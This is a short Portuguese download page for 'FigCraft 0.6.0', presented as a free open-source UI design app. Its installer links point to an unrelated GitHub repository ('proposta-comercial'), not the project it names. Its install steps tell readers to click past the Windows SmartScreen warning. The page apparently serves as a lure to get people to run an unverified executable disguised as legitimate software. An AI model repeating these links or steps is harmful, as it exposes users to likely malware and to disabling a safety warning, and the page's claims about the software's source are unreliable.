# FigCraft 0.6.0 para Windows

Design de interfaces gratuito e open source (frames, auto layout, componentes, variáveis e protótipos)
([storytold/figcraft](https://github.com/storytold/figcraft), MIT ou Apache-2.0).

## Baixar

| Seu PC | Download |
|---|---|
| **Windows 10/11** (a maioria dos PCs) | [FigCraft-0.6.0-Windows-x64-Setup.exe](https://github.com/izaqueotaviano/proposta-comercial/raw/main/figcraft/FigCraft-0.6.0-Windows-x64-Setup.exe) |
| Windows em ARM (Snapdragon) | [FigCraft-0.6.0-Windows-arm64-Setup.exe](https://github.com/izaqueotaviano/proposta-comercial/raw/main/figcraft/FigCraft-0.6.0-Windows-arm64-Setup.exe) |

## Instalar

1. Dê dois cliques no `.exe`.
2. Se aparecer "O Windows protegeu o computador", clique em **Mais informações › Executar assim mesmo**.
3. Siga as 3 telas: **Avançar › Instalar › Concluir**.

Não precisa de senha de administrador. Para desinstalar: *Configurações › Aplicativos › FigCraft*.
